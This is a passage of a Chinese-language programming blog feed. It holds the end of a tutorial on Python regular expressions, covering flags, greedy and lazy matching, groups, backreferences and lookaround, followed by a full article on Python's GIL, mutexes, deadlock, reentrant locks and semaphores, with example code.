不区分大小写</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>))  <span class="hljs-comment"># None</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, re.I))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 1), match=&#x27;A&#x27;&gt;</span><br><span class="hljs-comment"># 多行匹配</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;^test-\w*&#x27;</span>, <span class="hljs-string">&#x27;test-google\ntest-baidu\ntest-weibo&#x27;</span>))  <span class="hljs-comment"># [&#x27;test-google&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;^test-\w*&#x27;</span>, <span class="hljs-string">&#x27;test-google\ntest-baidu\ntest-weibo&#x27;</span>, re.M))  <span class="hljs-comment"># [&#x27;test-google&#x27;, &#x27;test-baidu&#x27;, &#x27;test-weibo&#x27;]</span><br><span class="hljs-comment"># 更改.含义</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;.*&#x27;</span>, <span class="hljs-string">&#x27;a\nb\nc&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 1), match=&#x27;a&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;.*&#x27;</span>, <span class="hljs-string">&#x27;a\nb\nc&#x27;</span>, re.S))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;a\nb\nc&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><p>当正则表达式中包含限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符（主动回溯），这被称为<strong>贪婪匹配</strong>；相反的是，在表达式能得到匹配的前提下匹配尽可能少的字符，这就是<strong>懒惰匹配</strong>。在使用上，只需在限定符后添加<code>?</code>，就可以将贪婪限定符转换为惰性限定符。</p><blockquote><p>限定符：限定前面的表达式出现的次数。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 贪婪匹配</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;$&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;aaaaa&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;aaaaa&#x27;&gt;</span><br><span class="hljs-comment"># 懒惰匹配</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;?$&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;aaaaa&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;?&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 2), match=&#x27;aa&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="分组和后向引用"><a href="#分组和后向引用" class="headerlink" title="分组和后向引用"></a>分组和后向引用</h2><h3 id="捕获分组"><a href="#捕获分组" class="headerlink" title="捕获分组"></a>捕获分组</h3><p>(exp) ：匹配表达式exp，并捕获文本到自动命名的组里。</p><p>(?P<name>exp) ：匹配表达式exp，并捕获文本到名称为name的组里。</p><blockquote><p>在使用小括号进行分组后，每个分组会自动拥有一个组号。组号分配会从左向右扫描两遍：先给未命名组分配，第一个出现的分组组号默认为1，第二个为2，以此类推，之后给命名组分配分组名称。分组0代表全局分组，对应着整个正则表达式匹配的结果。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">it = re.finditer(<span class="hljs-string">r&#x27;age:(?P&lt;agegroup&gt;\d+),name:(\w+)&#x27;</span>, <span class="hljs-string">&#x27;age:13,name:Tom;age:18,name:John&#x27;</span>)<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> it:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(m.group())  <span class="hljs-comment"># 输出捕获到的所有内容</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-number">0</span>))  <span class="hljs-comment"># 同m.group()</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-number">1</span>))  <span class="hljs-comment"># 输出age分组</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-string">&#x27;agegroup&#x27;</span>))  <span class="hljs-comment"># 同m.group(1)</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-number">2</span>))  <span class="hljs-comment"># 输出name分组</span><br></code></pre></td></tr></table></figure><h3 id="非捕获分组"><a href="#非捕获分组" class="headerlink" title="非捕获分组"></a>非捕获分组</h3><p>(?:exp)：匹配表达式exp，不捕获匹配的文本，也不给此分组分配组号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不忽略分组</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;age:(\d+),name:(\w+)&#x27;</span>, <span class="hljs-string">&#x27;age:13,name:Tom;age:18,name:John&#x27;</span>))  <span class="hljs-comment"># [(&#x27;13&#x27;, &#x27;Tom&#x27;), (&#x27;18&#x27;, &#x27;John&#x27;)]</span><br><span class="hljs-comment"># 忽略分组</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;age:(?:\d+),name:(\w+)&#x27;</span>, <span class="hljs-string">&#x27;age:13,name:Tom;age:18,name:John&#x27;</span>))  <span class="hljs-comment"># [&#x27;Tom&#x27;, &#x27;John&#x27;]</span><br></code></pre></td></tr></table></figure><h3 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h3><p>所谓后向引用，就是在后式中对前面出现过的分组再一次引用，可用于重复搜索前面某个分组匹配的文本。</p><ul><li>通过索引引用： <code>\1</code>表示引用第一个分组，<code>\2</code>表示引用第二个分组，以此类推，<code>\n</code>表示引用第n个分组。</li><li>通过命名分组名引用：命名 (?P<name>exp)，引用 (?P=name) 。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例1：匹配字符串中连续出现的两个相同单词</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b(\w+)\b\s+\1\b&#x27;</span>, <span class="hljs-string">&#x27;this is a test to match: Go Go home home&#x27;</span>))  <span class="hljs-comment"># [&#x27;Go&#x27;, &#x27;home&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b(?P&lt;testgroup&gt;\w+)\b\s+(?P=testgroup)\b&#x27;</span>, <span class="hljs-string">&#x27;this is a test to match: Go Go home home&#x27;</span>))  <span class="hljs-comment"># [&#x27;Go&#x27;, &#x27;home&#x27;]</span><br><br><span class="hljs-comment"># 示例2：字符串从后往前每隔3个字符插入一个&#x27;,&#x27;符号</span><br>s = <span class="hljs-string">&#x27;12345678900&#x27;</span><br>s = s[::-<span class="hljs-number">1</span>]<br>s = re.sub(<span class="hljs-string">r&#x27;(...)&#x27;</span>, <span class="hljs-string">r&#x27;\1,&#x27;</span>, s)<br><span class="hljs-built_in">print</span>(s[::-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 12,345,678,900</span><br></code></pre></td></tr></table></figure><h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>断言用来声明一个应该为真的事实，正则表达式中只有当断言为真时才会继续进行匹配。零宽断言是一种零宽度的匹配，它匹配到的内容不会保存到匹配结果中，最终匹配结果只是一个<strong>位置</strong>。</p><p>零宽断言用于查找在某些内容（但并不包括这些内容）之前或者之后的东西，这个位置应该满足一定的条件（即断言）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 零宽度正预测先行断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;, &#x27;watch&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watch&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watching1&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b.+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading and watch&#x27;]</span><br><span class="hljs-comment"># 零宽度正回顾后发断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread)\w+\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread)\w+\b&#x27;</span>, <span class="hljs-string">&#x27;reading1 and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing1&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread)\w+\b&#x27;</span>, <span class="hljs-string">&#x27;reading1 and reading2&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing1&#x27;, &#x27;ing2&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread).+\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing and watching&#x27;]</span><br><span class="hljs-comment"># 零宽度负预测先行断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;read and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading1 and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading1&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading1 and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading&#x27;, &#x27;and&#x27;, &#x27;watching&#x27;] ？？</span><br><span class="hljs-comment"># 零宽度负回顾后发断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;eading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;eading&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;1reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;1reading&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!rea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;1reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)\w*\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading&#x27;, &#x27;and&#x27;, &#x27;watching&#x27;] ？？</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析 Python3 各种锁机制</title>
    <link href="/post/%E6%B5%85%E6%9E%90Python3%E5%90%84%E7%A7%8D%E9%94%81%E6%9C%BA%E5%88%B6/"/>
    <url>/post/%E6%B5%85%E6%9E%90Python3%E5%90%84%E7%A7%8D%E9%94%81%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><ul><li>并发（Concurrency）：拥有交替处理多个任务的能力，但不是同时。通常适用于 I/O 密集型任务。</li><li>并行（Parallelism）：拥有同时处理多个任务的能力。通常适用于 CPU 密集型任务。</li></ul><h2 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h2><h3 id="GIL（全局解释器锁）"><a href="#GIL（全局解释器锁）" class="headerlink" title="GIL（全局解释器锁）"></a>GIL（全局解释器锁）</h3><p>GIL（Global Interpreter Lock）全局解释器锁，是最流行的 Python 解释器 <strong>CPython</strong>（官方解释器）中引入的一个概念，它使得同一个进程下任何时刻 <strong>仅有一个线程在执行</strong>，无法利用多核优势。由于GIL的存在，导致Python多线程性能甚至比单线程更糟。</p><p>在 Cpython 中，每一个线程在开始执行时，都会获得 GIL 阻止别的线程执行，在线程遇到 I/O 等会引起阻塞状态的操作时，会释放 GIL 以允许其他线程开始利用资源。同时，CPython 中还有一个 <strong>间隔检查（check interval）</strong> 机制，即 CPython 解释器会轮询检查线程 GIL 锁的获得情况，每隔一段时间就会强制当前线程释放 GIL，使别的线程能有执行的机会。这样一来，用户看到的就是“伪”并行，即 Python 线程在交替执行，但并没有真正的并行。</p><p>线程抢占 GIL 的调度流程，如下图所示：</p><p><img src="/img/Python/2-1ZS012105L23.gif" alt="GIL 工作流程示意图"></p><p><strong>引入 GIL 的原因</strong></p><ol><li>设计者为了规避类似于内存管理这样复杂的条件竞争问题。</li><li>CPython 使用了大量 C 语言库，但大部分 C 语言库都不是原生线程安全的。</li></ol><blockquote><p>注：<strong>Python GIL 不能绝对保证线程安全</strong>，因为即便 GIL 仅允许一个 Python 线程执行，但 CPython 还有 check interval 这样的抢占机制。即 GIL 的设计，主要是为了方便 CPython 解释器层的编写者，而不是为了 Python 应用层的软件工程师。</p></blockquote><p><strong>如何绕过 GIL</strong></p><ol><li>绕过 CPython，使用 JPython 等其他解释器。</li><li>把关键的性能代码，用 C 语言来实现。</li><li>多核 CPU 可使用多进程并行的方式，替代多线程并发。</li></ol><p><strong>示例：多线程访问同一变量（未加锁）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>total = <span class="hljs-number">10</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sale</span>():</span><br>    <span class="hljs-keyword">global</span> total<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;售出第%s张票...&#x27;</span> % (<span class="hljs-number">10</span> - total + <span class="hljs-number">1</span>))<br>    <span class="hljs-comment"># time.sleep(0.001)  # 等待io操作</span><br>    total -= <span class="hljs-number">1</span><br>    <span class="hljs-comment"># time.sleep(0.001)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;剩余%s张票\n&#x27;</span> % total)<br><br><br>threads = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t = threading.Thread(target=sale, args=())<br>    threads.append(t)<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.start()<br><span class="hljs-comment"># cpu密集型（注释掉io操作）：结果符合预期（线程start前total-=1已经计算完成）</span><br><span class="hljs-comment"># io密集型：结果异常</span><br></code></pre></td></tr></table></figure><h3 id="互斥锁（同步锁）"><a href="#互斥锁（同步锁）" class="headerlink" title="互斥锁（同步锁）"></a>互斥锁（同步锁）</h3><p>互斥锁（Mutex），保证同一时间只能有一个线程修改共享数据，解决了上述io密集型场景产生的计算错误问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>total = <span class="hljs-number">10</span><br>lock = threading.Lock()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sale</span>():</span><br>    <span class="hljs-keyword">global</span> total<br>    lock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在售出第%s张票...&#x27;</span> % (<span class="hljs-number">10</span> - total + <span class="hljs-number">1</span>))<br>    time.sleep(<span class="hljs-number">0.001</span>)  <span class="hljs-comment"># 等待io操作</span><br>    total -= <span class="hljs-number">1</span><br>    time.sleep(<span class="hljs-number">0.001</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;剩余%s张票\n&#x27;</span> % total)<br>    lock.release()<br><br><br>threads = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t = threading.Thread(target=sale, args=())<br>    threads.append(t)<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.start()<br></code></pre></td></tr></table></figure><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>由于保护不同的数据应该使用不同的互斥锁，当有多个互斥锁存在的时候，就可能会导致死锁。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 发生死锁的情况</span><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>lockA = threading.Lock()<br>lockB = threading.Lock()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    lockA.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lockA&#x27;</span>)<br>    lockB.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lockB&#x27;</span>)<br>    lockA.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lockA&#x27;</span>)<br>    lockB.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lockB&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    lockB.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire lockB&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 等待io操作</span><br>    lockA.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire lockA&#x27;</span>)<br>    lockB.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lockB&#x27;</span>)<br>    lockA.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lockA&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    foo()<br>    bar()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    t = threading.Thread(target=run, args=())<br>    t.start()<br></code></pre></td></tr></table></figure><h3 id="递归锁（可重入锁）"><a href="#递归锁（可重入锁）" class="headerlink" title="递归锁（可重入锁）"></a>递归锁（可重入锁）</h3><p>递归锁（Recursive Mutex）可以被获取多次，并且只能被所有者释放，用于解决多个互斥锁死锁情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>rlock = threading.RLock()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lock-1&#x27;</span>)<br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lock-1&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire lock-1&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 等待io操作</span><br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lock-1&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    foo()<br>    bar()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    t = threading.Thread(target=run, args=())<br>    t.start()<br></code></pre></td></tr></table></figure><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>信号量（Semaphore），用于多线程同步，限制线程的并发量。</p><blockquote><p>mutex是semaphore的一种特殊情况（n=1时）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>sem = threading.Semaphore(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 每2秒打印5次线程名称</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    sem.acquire()<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(threading.current_thread().name)<br>    sem.release()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    <span class="hljs-keyword">with</span> sem:  <span class="hljs-comment"># 使用with语句</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span>(threading.current_thread().name)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t = threading.Thread(target=foo, args=[])<br>    t.start()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>多线程</tag>
      
      <tag>GIL</tag>
      
      <tag>锁机制</tag>
      
      <tag>高并发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 下划线含义</title>
    <link href="/post/Python%E4%B8%8B%E5%88%92%E7%BA%BF%E5%90%AB%E4%B9%89/"/>
    <url>/post/Python%E4%B8%8B%E5%88%92%E7%BA%BF%E5%90%AB%E4%B9%89/</url>
    
